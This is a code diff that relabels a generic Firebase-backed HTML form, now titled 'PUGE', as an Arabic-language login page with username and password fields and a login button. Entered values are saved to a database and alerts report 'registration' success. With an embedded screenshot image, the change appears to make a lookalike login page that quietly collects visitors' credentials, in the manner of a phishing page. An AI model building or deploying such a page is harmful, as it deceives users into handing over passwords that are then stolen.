@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Firebase Form</title>
+  <title>PUGE</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -93,9 +93,9 @@
     <div class="login-box">
       <img src="Capture.PNG" alt="Capture">
       <form id="dataForm">
-        <input type="text" id="field1" placeholder="Field 1" required>
-        <input type="text" id="field2" placeholder="Field 2" required>
-        <button type="submit">Submit</button>
+        <input type="text" id="field1" placeholder="اسم المستخدم" required>
+        <input type="text" id="field2" placeholder="رقم سري" required>
+        <button type="submit">دخول</button>
       </form>
     </div>
     <div class="video-container">
@@ -143,9 +143,9 @@
         field2: field2
       }, (error) => {
         if (error) {
-          alert("Data could not be saved. " + error);
+          alert("فشل عملية التسجيل. " + error);
         } else {
-          alert("Data saved successfully.");
+          alert("نجحت عملية التسجيل .");
         }
       });
     }
